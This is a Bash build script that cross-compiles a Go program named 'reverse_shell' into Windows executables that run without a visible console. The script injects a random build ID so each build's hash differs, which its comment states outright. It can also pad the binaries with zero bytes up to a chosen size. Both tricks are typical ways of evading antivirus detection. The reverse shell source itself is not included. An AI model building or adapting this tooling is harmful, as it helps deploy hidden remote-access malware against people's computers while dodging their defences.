#!/bin/bash

set -euo pipefail

# 交叉编译脚本 - 在 macOS / Linux 上编译 Windows 可执行文件
# 用法:
#   ./build.sh
#   ./build.sh 15MB
#   ./build.sh 5242880

OUTPUT_NAME="reverse_shell"
OUTPUT_DIR="./bin"
OUTPUT_WIN64="$OUTPUT_DIR/${OUTPUT_NAME}_win64.exe"
OUTPUT_WIN32="$OUTPUT_DIR/${OUTPUT_NAME}_win32.exe"

usage() {
    cat <<'EOF'
Usage: ./build.sh [target_size]

Examples:
  ./build.sh
  ./build.sh 15MB
  ./build.sh 5M
  ./build.sh 5242880

Notes:
  - 如果指定 target_size，脚本会先正常编译，再在 exe 末尾追加 0x00 字节填充到目标大小。
  - 支持单位: B, K/KB, M/MB, G/GB。
  - 目标大小必须大于等于编译后的原始 exe 大小。
EOF
}

parse_size_to_bytes() {
    local input="${1//[[:space:]]/}"
    local number unit multiplier

    if [[ ! "$input" =~ ^([0-9]+)([KkMmGg]?)([Bb]?)$ ]]; then
        return 1
    fi

    number="${BASH_REMATCH[1]}"
    unit="${BASH_REMATCH[2]}"

    case "$unit" in
        "" ) multiplier=1 ;;
        [Kk]) multiplier=1024 ;;
        [Mm]) multiplier=$((1024 * 1024)) ;;
        [Gg]) multiplier=$((1024 * 1024 * 1024)) ;;
        * ) return 1 ;;
    esac

    echo $((number * multiplier))
}

file_size_bytes() {
    local path="$1"
    if stat -f%z "$path" >/dev/null 2>&1; then
        stat -f%z "$path"
    else
        stat -c%s "$path"
    fi
}

pad_file_to_size() {
    local path="$1"
    local target_size="$2"
    local current_size padding chunk_size chunk_count remainder new_size

    current_size=$(file_size_bytes "$path")
    if (( current_size > target_size )); then
        echo "[-] 目标大小过小: $path 当前为 ${current_size} bytes，目标为 ${target_size} bytes"
        return 1
    fi

    padding=$((target_size - current_size))
    if (( padding == 0 )); then
        echo "[*] $(basename "$path") 已经是目标大小: ${target_size} bytes"
        return 0
    fi

    echo "[*] Padding $(basename "$path") with ${padding} bytes..."

    chunk_size=$((1024 * 1024))
    chunk_count=$((padding / chunk_size))
    remainder=$((padding % chunk_size))

    if (( chunk_count > 0 )); then
        dd if=/dev/zero bs="$chunk_size" count="$chunk_count" >> "$path" 2>/dev/null
    fi

    if (( remainder > 0 )); then
        dd if=/dev/zero bs=1 count="$remainder" >> "$path" 2>/dev/null
    fi

    new_size=$(file_size_bytes "$path")
    if (( new_size != target_size )); then
        echo "[-] 填充失败: $path 最终大小为 ${new_size} bytes，预期为 ${target_size} bytes"
        return 1
    fi

    echo "[+] $(basename "$path") 已填充到 ${new_size} bytes"
}

print_md5() {
    if command -v md5 >/dev/null 2>&1; then
        md5 "$OUTPUT_WIN64" "$OUTPUT_WIN32"
    else
        md5sum "$OUTPUT_WIN64" "$OUTPUT_WIN32"
    fi
}

print_sha256() {
    if command -v shasum >/dev/null 2>&1; then
        shasum -a 256 "$OUTPUT_WIN64" "$OUTPUT_WIN32"
    else
        sha256sum "$OUTPUT_WIN64" "$OUTPUT_WIN32"
    fi
}

TARGET_SIZE_RAW=""
TARGET_SIZE_BYTES=""
if (( $# > 1 )); then
    usage
    exit 1
fi

if (( $# == 1 )); then
    TARGET_SIZE_RAW="$1"
    if ! TARGET_SIZE_BYTES=$(parse_size_to_bytes "$TARGET_SIZE_RAW"); then
        echo "[-] 无法解析目标大小: $TARGET_SIZE_RAW"
        usage
        exit 1
    fi
fi

# 生成随机字符串（每次编译不同，使 MD5 变化）
RANDOM_STR=$(head -c 32 /dev/urandom | base64 | tr -dc 'a-zA-Z0-9' | head -c 32)
BUILD_TIME=$(date +%s)
BUILD_ID="${RANDOM_STR}_${BUILD_TIME}"

echo "[*] Build ID: $BUILD_ID"
if [[ -n "$TARGET_SIZE_BYTES" ]]; then
    echo "[*] Target size: ${TARGET_SIZE_RAW} (${TARGET_SIZE_BYTES} bytes)"
fi

# 创建输出目录
mkdir -p "$OUTPUT_DIR"

echo "[*] Building Windows executables..."

# 通过 -ldflags -X 注入随机字符串到二进制文件
LDFLAGS="-s -w -H windowsgui -X main.buildID=$BUILD_ID"

# Windows 64位
echo "[+] Compiling Windows amd64..."
GOOS=windows GOARCH=amd64 go build -ldflags="$LDFLAGS" -o "$OUTPUT_WIN64" main.go

# Windows 32位
echo "[+] Compiling Windows 386..."
GOOS=windows GOARCH=386 go build -ldflags="$LDFLAGS" -o "$OUTPUT_WIN32" main.go

if [[ -n "$TARGET_SIZE_BYTES" ]]; then
    echo ""
    echo "[*] Applying size padding..."
    pad_file_to_size "$OUTPUT_WIN64" "$TARGET_SIZE_BYTES"
    pad_file_to_size "$OUTPUT_WIN32" "$TARGET_SIZE_BYTES"
fi

echo ""
echo "[*] Build complete! Output files:"
ls -lh "$OUTPUT_WIN64" "$OUTPUT_WIN32"

echo ""
echo "[*] File hashes (MD5):"
print_md5

echo ""
echo "[*] File hashes (SHA256):"
print_sha256
